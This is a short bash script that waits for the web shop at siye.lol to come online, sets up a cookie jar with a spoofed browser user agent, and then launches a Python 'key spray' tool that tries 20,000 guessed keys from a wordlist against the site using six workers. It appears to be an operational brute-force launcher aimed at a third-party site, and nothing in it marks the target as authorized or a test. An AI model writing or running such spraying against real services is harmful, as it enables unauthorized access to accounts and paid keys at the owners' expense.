#!/bin/bash
set -u
OUT=/workspace/siye/results/spray
LOG=$OUT/wait.log
mkdir -p "$OUT"
PROXY=""
# prefer direct; if fail try share via fetching
while true; do
  code=$(curl -sS -m 12 -A 'Mozilla/5.0' 'https://siye.lol/shop/' -o /dev/null -w '%{http_code}' 2>/dev/null || echo 000)
  echo "$(date -u +%H:%M:%S) direct=$code" | tee -a "$LOG"
  if [ "$code" = "200" ]; then
    echo "UP - starting gentle spray" | tee -a "$LOG"
    # warm
    curl -sS -m 15 -A 'Mozilla/5.0' -c $OUT/c.jar -b $OUT/c.jar 'https://siye.lol/shop/' -o /dev/null
    python3 /workspace/siye/scripts/tools_key_spray.py \
      --keys /workspace/siye/wordlists/siye_tools_top20k.txt \
      --out "$OUT" --workers 6 --progress-every 100 2>&1 | tee -a "$OUT/console.log"
    exit $?
  fi
  sleep 45
done
